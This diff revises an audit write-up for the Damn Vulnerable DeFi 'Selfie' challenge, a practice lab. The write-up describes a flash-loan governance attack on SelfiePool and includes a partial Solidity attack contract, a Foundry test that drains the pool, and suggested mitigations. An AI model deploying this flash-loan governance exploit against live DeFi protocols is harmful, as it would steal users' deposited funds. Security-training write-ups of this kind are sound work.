@@ -1,8 +1,8 @@
-## Critical Severity Issues
+# Critical Severity Issues
 
-### [C-1] `SelfiePool` Flash Loan Lead to Governance Attack
+## [C-1] `SelfiePool` Flash Loan Leads to Governance Attack
 
-**Description:** The `SelfiePool` protocol allows users to take flash loan as much as they can.But the attacker use that flash loan attain the governance power and queue the propsal of `emergencyExit` function call via signature.After two days of interval attacker execute his attack and darin the entire protocol funds.
+**Description:** The `SelfiePool` protocol allows users to take a flash loan of any amount they desire. However, an attacker can exploit this flash loan to gain governance power and queue a proposal for the `emergencyExit` function call via a signature. After a two-day interval, the attacker executes the attack and drains all the protocol’s funds.
 
 ```javascript
 function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data) external nonReentrant returns (bool) {
@@ -23,12 +23,12 @@ function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amo
         }
 
         return true;
-    }
+}
 ```
 
-**Impact:** An attacker leverage the governance power, queue and execute pool tokens withdrwal for his self.
+**Impact:** An attacker leverages governance power to queue and execute the withdrawal of pool tokens to their own address.
 
-Attack Contract:
+**Attack Contract:**
 
 ```javascript
 contract Attack is IERC3156FlashBorrower {
@@ -38,15 +38,15 @@ contract Attack is IERC3156FlashBorrower {
 
     uint256 public actionId;
 
-    constructor( SimpleGovernance _simpleGovernance, DamnValuableVotes _token, SelfiePool _pool) {
+    constructor(SimpleGovernance _simpleGovernance, DamnValuableVotes _token, SelfiePool _pool) {
         simpleGovernance = _simpleGovernance;
         dvt = _token;
         pool = _pool;
     }
 
-    function onFlashLoan( address initiator, address token, uint256 amount, uint256 fee, bytes calldata data
+    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data
     ) external returns (bytes32) {
-        // get voting power
+        // Get voting power
         dvt.delegate(address(this));
 
         actionId = simpleGovernance.queueAction(
@@ -65,21 +65,20 @@ contract Attack is IERC3156FlashBorrower {
 
     fallback() external payable {}
 }
-
 ```
 
 **Proof of Concept:**
 
-1. Attacker call take flashloan
-2. leaverage that flash loan and get voting power.
-3. execute the propsal of EmergencyExit.
-4. After two days darin the entire protocol tokens.
+1. The attacker calls the function to take a flash loan.
+2. The attacker leverages the flash loan to gain voting power.
+3. After a two-day period, the attacker calls the `execute` function.
+4. This function internally calls `emergencyExit` from the governance contract using an encoded function selector.
+5. The attacker drains all the protocol’s tokens.
 
 **Proof of Code:**
 
 ```javascript
 function testAttack() public {
-        // Activate voting power
         vm.startPrank(address(target));
         pool.flashLoan(
             IERC3156FlashBorrower(target),
@@ -91,7 +90,11 @@ function testAttack() public {
         vm.warp(block.timestamp + 2 days);
         target.execute();
         vm.stopPrank();
-    }
+}
 ```
 
 **Recommended Mitigation:**
+
+1. Do not allow anyone to take a flash loan exceeding the total supply of tokens.
+2. Restrict calls to only specific function selectors.
+3. Implement alternative governance mechanisms to prevent such attacks.
